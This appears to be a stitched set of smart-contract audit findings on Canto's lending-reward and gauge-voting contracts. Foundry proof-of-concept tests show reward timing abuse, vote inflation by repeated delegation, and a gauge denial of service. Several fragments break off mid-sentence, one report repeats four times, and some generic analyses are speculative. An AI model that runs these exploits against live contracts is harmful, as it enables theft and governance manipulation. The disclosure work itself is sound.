            "detail": "\n# Vulnerability details\n\n## Impact\nIn the `LendingLedger` contract, a user is rewarded with CANTO tokens depending on how long he has his deposit in the market. Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.\n\n## Proof of Concept\nTest case for the `LendingLedger.t.sol`\n```\n    function setupStateBeforeClaim() internal {\n        whiteListMarket();\n\n        vm.prank(goverance);\n        ledger.setRewards(0, WEEK*10, amountPerEpoch);\n\n        // deposit into market at 23:59 (week 4)\n        vm.warp((WEEK * 5) - 1);\n\n        int256 delta = 1.1 ether;\n        vm.prank(lendingMarket);\n        ledger.sync_ledger(lender, delta);\n\n        // airdrop ledger enough token balance for user to claim\n        payable(ledger).transfer(1000 ether);\n        // withdraw at 00:00 (week 5)\n        vm.warp(block.timestamp + 1);\n        vm.prank(lendingMarket);\n        ledger.sync_ledger(lender, delta * (-1));\n    }\n\n    function testClaimValidLenderOneEpoch() public {\n        setupStateBeforeClaim();\n\n        uint256 balanceBefore = address(lender).balance;\n        vm.prank(lender);\n        ledger.claim(lendingMarket, 0, type(uint256).max);\n        uint256 balanceAfter = address(lender).balance;\n        assertTrue(balanceAfter - balanceBefore == 1 ether);\n\n        uint256 claimedEpoch = ledger.userClaimedEpoch(lendingMarket, lender);\n        assertTrue(claimedEpoch - WEEK*4 == WEEK);\n    }\n```\n## Tools Used\nFoundry\n## Recommended Mitigation Steps\nIt's difficult to propose a solution for this exploit without major changes in the contract's architecture. Perhaps we can somehow split the amount based on the time the sync was made inside the week, let's say Alice's `last_sync` was in the middle of week0, she deposited 1 ether, thus her amount for the current epoch will be 1/2 ether. However there is a caveat, how do we fill the gaps? We can't fill them with 1/2 ether. We can use this struct though,\n```\nAmount {\n    uint256 actualAmount,\n    uint256 fraction\n}\n```\nso we can use `fraction` for the current epoch and `actualAmount = 1 ether` to fill the gaps. \n\n\n## Assessed type\n\nTiming"

                "description": "The `sync_ledger` function calls two external unverified functions `_checkpoint_lender` and `_checkpoint_market` passing `type(uint256).max` as an argument. These external calls could potentially introduce reentrancy attacks. Without knowing the internals of these functions, they could, in theory, call back into `sync_ledger` or other public functions of the smart contract, manipulating the contract state before the initial execution is completed. This recursive calling back can lead to funds being drained or contract state being corrupted.\n\nIn addition, if the `_checkpoint_lender` and `_checkpoint_market` functions are meant to interact with other contracts (especially considering they take an address and a max uint value), they could also be susceptible to reentrancy if not properly secured. It's a well-known best practice to use state changes before external calls to prevent reentrancy attacks (checks-effects-interactions pattern), and also to make use of mutexes or the `nonReentrant` modifier (if using OpenZeppelin libraries).\n\nOther considerations like arithmetic overflows or underflows are also a concern due to the use of `int256` and operations that include addition, which could lead to overflows if `_delta` is large enough or underflows if it is negative and the balance is not sufficient, although this is somewhat mitigated by the presence of the `require` checks.\n\nTo summarize, the provided code snippet is potentially vulnerable to reentrancy attacks depending on the behavior of the `_checkpoint_lender` and `_checkpoint_market` functions. It would be necessary to access the code of these functions to fully assess the possible vulnerabilities and to validate whether they handle state, perform external calls, and manage control flows safely.",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Impact\nVoting power towards gauges will be lost and project will not work properly \n\n## Proof of Concept\nThe mapping `time_weight` takes a gauge as a param and returns the most recent timestamp a gauge has had its weight recorded/ updated. There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`. \n```solidity\nfunction _get_weight(address _gauge_addr) private returns (uint256) {\n        uint256 t = time_weight[_gauge_addr];\n        if (t > 0) {\n            Point memory pt = points_weight[_gauge_addr][t];\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n            return pt.bias;\n        } else {\n            return 0;\n        }\n    }\n``` \nThe problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value.\n```solidity\n    function _change_gauge_weight(address _gauge, uint256 _weight) internal {\n        uint256 old_gauge_weight = _get_weight(_gauge);\n        uint256 old_sum = _get_sum();\n        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;\n\n        points_weight[_gauge][next_time].bias = _weight;\n        time_weight[_gauge] = next_time;\n\n        uint256 new_sum = old_sum + _weight - old_gauge_weight;\n        points_sum[next_time].bias = new_sum;\n        time_sum = next_time;\n    }\n```\nSince `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.\nHere are 3 written test-cases which prove the statements above: \n```solidity\n   function testWithoutManualSet() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithManualSet() public { \n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithChangeMidway() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n\n        vm.prank(gov);\n        gc.change_gauge_weight(gauge1, 0);\n\n        vm.startPrank(user1);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set\", weight);\n\n        gc.vote_for_gauge_weights(gauge1, 0);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set after vote reset\", weight);\n        \n    }\n```\nand the respective results:\n```\n[PASS] testWithoutManualSet() (gas: 645984)\nLogs:\n  gauge's weight after voting:  0\n```\n```\n[PASS] testWithManualSet() (gas: 667994)\nLogs:\n  gauge's weight after voting:  993424657416307200\n```\n```\n[PASS] testWithChangeMidway() (gas: 744022)\nLogs:\n  gauge's weight after voting:  0\n  gauge's weight after voting after admin set 0\n  gauge's weight after voting after admin set after vote reset 993424657416307200\n```\n\n## Tools Used\nManual Review, Foundry\n\n## Recommended Mitigation Steps\nUpon adding a gauge, make a call to `change_gauge_weight` and set its initial weight to 0. \n\n\n\n\n\n## Assessed type\n\nError"

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

The code assumes self-delegation when the delegate parameter is `address(0)` and blindly trusts the input to change the delegate, which leads to the incorrect delegation and potential hijacking of the user's voting power when a contribution is made on their behalf. The problematic situation arises when someone makes a contribution for a user who was previously self-delegated. In this case, the malicious actor can overwrite the previously self-delegated address with their own address by making a contribution with a non-zero delegate address.\n\nThe report suggests that self-delegation should be hardcoded to prevent this vulnerability, meaning that if a contributor is making a contribution for themselves and the delegate parameter is `address(0)`, the contract should automatically set the self-delegate instead of allowing anyone to specify a different delegate.\n\nThe `delegate` function provided is not directly related to the described vulnerability as it does not handle contributions or voting power adjustment in the same way as the `_processContribution` function. However, the `delegate` function does handle delegations in general, and any issues with access control in one part of the contract (such as the delegation logic) could potentially impact other parts of the contract as well.\n\nIn summary, the report details a specific vulnerability in the `_processContribution` function related to hijacking of self-delegation. The `delegate` function is not vulnerable to the exact issue described but given that it is part of the overall delegation logic, the entire contract should be reviewed for access control issues to ensure that all delegation functionality is secure.",

The provided Proof of Concept (PoC) shows that the `_processContribution` function is not properly checking if the delegate being set for a contribution is indeed the contributor themselves or a legitimate delegate, allowing the attacker to set their address as the delegate for another user's contribution. A patch has been suggested to enforce self-delegation when `delegate` is set to `address(0)` and to ensure that `msg.sender` is the contributor. This patch would mitigate the reported vulnerability by enforcing proper access control and preventing unauthorized changes to delegation.",

When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`.

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

                "description": "The arithmetic operations in the `vote_for_gauge_weights` function do not account for the possibility of integer overflow and underflow, which are common issues in smart contracts not using SafeMath library operations or Solidity 0.8.0 or higher that has built-in overflow/underflow checking.\n\nThe following calculations are susceptible to overflow and underflow:\n\n1. `power_used = power_used + new_slope.power - old_slope.power;`\n2. `points_weight[_gauge_addr][next_time].bias = Math.max(old_weight_bias + new_bias, old_bias) - old_bias;`\n3. `points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_bias) - old_bias;`\n4. `changes_weight[_gauge_addr][old_slope.end] -= old_slope.slope;`\n5. `changes_sum[old_slope.end] -= old_slope.slope;`\n6. `changes_weight[_gauge_addr][new_slope.end] += new_slope.slope;`\n7. `changes_sum[new_slope.end] += new_slope.slope;`\n\nSolildity version prior to 0.8.0 does not automatically check for arithmetic overflows and underflows. Hence, if the value of `new_slope.power` is less than `old_slope.power`, the subtraction could result in an underflow as `uint256` cannot represent negative numbers. Similarly, the addition operation could result in an overflow if the sum exceeds the maximum value that can be stored in a `uint256`.\n\nThe `Math.max` method used in the contract is presumed to return the greater of the two values passed to it, however, further inspection of the `Math.max` function implementation is necessary to ensure it is safe from overflow/underflow. If this function is not correctly implemented to handle such issues, it could introduce vulnerabilities as well.\n\nIt's important to note that the require statement `require(power_used >= 0 && power_used <= 10_000, \"Used too much power\");` is not meaningful for a `uint256` as it cannot be negative and the check for `>= 0` is always true.\n\nTo mitigate these risks, the contract should use Solidity version 0.8.0 or later, or incorporate a library like OpenZeppelin's SafeMath for arithmetic operations to prevent overflows and underflows.",

            "detail": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

